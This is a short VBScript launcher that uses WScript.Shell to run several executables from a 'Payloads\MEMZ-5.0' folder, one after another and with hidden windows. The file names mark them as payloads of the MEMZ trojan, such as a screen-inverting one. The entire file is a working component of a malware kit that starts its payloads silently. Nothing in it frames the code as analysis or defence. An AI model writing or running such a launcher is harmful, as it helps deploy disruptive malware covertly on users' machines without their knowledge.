set WSHShell = CreateObject("WScript.Shell") 'dotnet reference
' WScript.Sleep 550 but we already slept
WSHShell.Run ".\Payloads\MEMZ-5.0\MEMZPayloads-InvertScreen.exe", 0
WScript.Sleep 500
WSHShell.Run ".\Payloads\MEMZ-5.0\MEMZPayloads-3.exe", 0
WScript.Sleep 500
WSHShell.Run ".\Payloads\MEMZ-5.0\MEMZPayloads-6.exe", 0
WScript.Sleep 500
WSHShell.Run ".\Payloads\MEMZ-5.0\MEMZPayloads-1.exe", 0